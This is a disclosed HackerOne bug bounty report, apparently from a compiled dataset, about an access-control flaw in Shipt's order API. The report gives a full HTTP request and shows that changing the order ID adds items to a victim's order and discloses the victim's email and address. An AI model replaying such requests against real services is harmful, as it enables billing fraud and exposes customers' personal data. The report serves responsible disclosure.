---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1903322'
original_report_id: '1903322'
title: Improper Access Control + Financial fraud allows attacker to disclose + add
  arbitrary products to another's user's order
weakness: Improper Access Control - Generic
team_handle: shipt
created_at: '2023-03-13T13:44:06.954Z'
disclosed_at: '2024-05-08T09:09:10.738Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 48
asset_identifier: api.shipt.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- improper-access-control-generic
---

# Improper Access Control + Financial fraud allows attacker to disclose + add arbitrary products to another's user's order

## Metadata

- HackerOne Report ID: 1903322
- Weakness: Improper Access Control - Generic
- Program: shipt
- Disclosed At: 2024-05-08T09:09:10.738Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Context

The [https://www.shipt.com](https://www.shipt.com)  website allows users to place orders and **modify** them after they were placed.
To modify an order after it was placed, it must be in a state **before** the shopping is in progress. This allows customers to adjust an order before its final shipment

## Vulnerability

It is possible to **add arbitrary products** to another's user's order before it was placed. By sending the proper HTTP request, the content of the target order is also disclosed, including the victim user's physical address.

## Steps to reproduce

1. Place **two** distinct orders, with **two different accounts**. To simplify the process, place them in the same shop and place the order in the future.

For this Proof-of-Concept, the technical values were the following : 

Key|Value|
----|-----|
Attacker e-mail| bzhunt.pentester.two@gmail.com|
Victim e-mail| bzhunt.pentester.one@gmail.com|
Attacker order ID| 1813918441|
Victim order ID|181396149|

For the sake of simplicity, the adress was set to **1020 South St, Philadelphia, PA 19147** and the shop was **CVS** (`"store":{"store_id":60,"store_location_id":29244,"metro_id":210,"name":"CVS"`)

Once the orders are placed, proceed to step two.


2. For both orders, add a new item to the placed order. An HTTP **POST** request similar to the one below will be sent : 

```burp
POST /aviator/v2/orders/1813918441/add.json?anonymous_id=deac090c-2b05-4402-b33f-468060058145&white_label_key=shipt&segway_version=6668a3d631495cebf307423e23a588c5f9d929c1&zip=19147&user_id=48645513&metro_id=124&store_id=60&bucket_number=72&store_location_id=13204&platform=web HTTP/2
Host: api.shipt.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json, text/plain, */*
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 154
Referer: https://www.shipt.com/
Origin: https://www.shipt.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
X-Pwnfox-Color: blue
Authorization: Bearer [YOUR TOKEN HERE]
Te: trailers

{"zip":"19147","user_id":48645513,"metro_id":124,"store_id":60,"bucket_number":72,"store_location_id":13204,"products":[{"id":4799771,"qty":1,"note":""}]}
```

To perform the exploit, simply replace the order number in the URL with the order number of your victim. For instance here : 
- /aviator/v2/orders/**1813918441**/add.json  -- > becomes --> /aviator/v2/orders/**181396149**/add.json

The server will indeed add the selected products in the victim's cart and additionnally disclose the content of the cart and the customer's e-mail address : 

{F2224254}

Additionnally, by targeting other orders numbers, it is possible to disclose the status of orders numbers. For example : 
- An order cannot be updated because shopping is in progress
- Could not retrieve product info (if the shop is different)

## Impact

The vulnerability described here has significant impacts on both the customers and the company, as it involves the manipulation of orders and the exposure of sensitive customer information.
Indeed, the exploit both discloses user's physical address as well as having them billed for unwanted items. 

However the business impacts of the vulnerability can go quite beyond this scope. Indeed, customers who fall victim to the attack will be billed for unwanted items, leading to financial loss for them. Additionally, the company may have to issue refunds or compensate customers, resulting in financial losses for the company. Similarly, this could also impact the smooth running of deliveries from an operational point of view.

From a reputational perspective, customers who have been affected by the attack may lose trust in the company and its ability to protect their personal and financial information. This could result in negative reviews, decreased sales, and a damaged reputation for the company.

For the physical address, this also adds addtional personal safety concerns.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
